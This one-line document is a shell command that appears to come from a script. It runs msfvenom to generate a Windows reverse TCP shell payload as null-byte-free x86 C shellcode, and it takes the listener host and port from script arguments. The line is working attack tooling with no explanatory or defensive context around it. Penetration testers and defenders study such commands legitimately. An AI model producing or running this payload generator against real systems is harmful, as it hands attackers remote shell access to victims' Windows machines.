msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=$2 EXITFUNC=thread -f c -a x86 -b "\x00"

